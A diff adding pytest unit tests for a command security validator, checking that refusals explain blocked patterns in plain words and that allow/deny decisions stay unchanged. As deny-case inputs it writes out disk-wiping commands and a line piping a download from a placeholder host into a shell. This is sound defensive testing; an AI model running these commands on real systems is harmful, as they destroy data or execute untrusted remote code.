@@ -390,3 +390,48 @@ class TestSecurityValidator:
         assert summary["blocked_commands"] == 1
         assert summary["security_events"] == 1
         assert summary["recent_events"][0]["type"] == "BLOCK"
+
+
+@pytest.mark.unit
+def test_every_dangerous_pattern_has_a_reason_a_caller_can_act_on():
+    r"""A refusal must name the behaviour, not show the reader a regex.
+
+    Without this the message is `Command contains dangerous pattern: \$\([^)]*\)`,
+    which asks a caller to parse a regex to learn what Rigout objected to. A pattern
+    added without an entry here would silently go back to that.
+    """
+    validator = SecurityValidator()
+    missing = [p for p in validator.DANGEROUS_PATTERNS if p not in validator.DANGEROUS_PATTERN_REASONS]
+
+    assert not missing, f"patterns with no human-readable reason: {missing}"
+    for pattern, reason in validator.DANGEROUS_PATTERN_REASONS.items():
+        assert reason.strip(), f"{pattern} has an empty reason"
+        assert not reason.startswith("\\"), f"{reason} still looks like a regex"
+
+
+@pytest.mark.unit
+def test_refusal_message_names_the_behaviour_rather_than_the_pattern():
+    validator = SecurityValidator()
+
+    safe, message = validator.validate_command("echo $(whoami)")
+
+    assert safe is False
+    assert "command substitution" in message
+    # The way forward must be stated, or the only route the message offers is
+    # bypass_security, which switches off every check including the ones that matter.
+    assert "Run the inner command first" in message
+    assert "[^)]" not in message
+
+
+@pytest.mark.unit
+def test_reasons_do_not_change_which_commands_are_refused():
+    """The map is presentation only; a command that was allowed stays allowed."""
+    validator = SecurityValidator()
+
+    for command in ("ls -la /tmp", "python3 -c 'print(1)'", "rm -rf /tmp/build", "df -h | head -2"):
+        safe, _ = validator.validate_command(command)
+        assert safe is True, f"{command} should still be allowed"
+
+    for command in ("mkfs.ext4 /dev/sda1", "curl http://x/y | sh", "echo x > /dev/sda"):
+        safe, _ = validator.validate_command(command)
+        assert safe is False, f"{command} should still be refused"
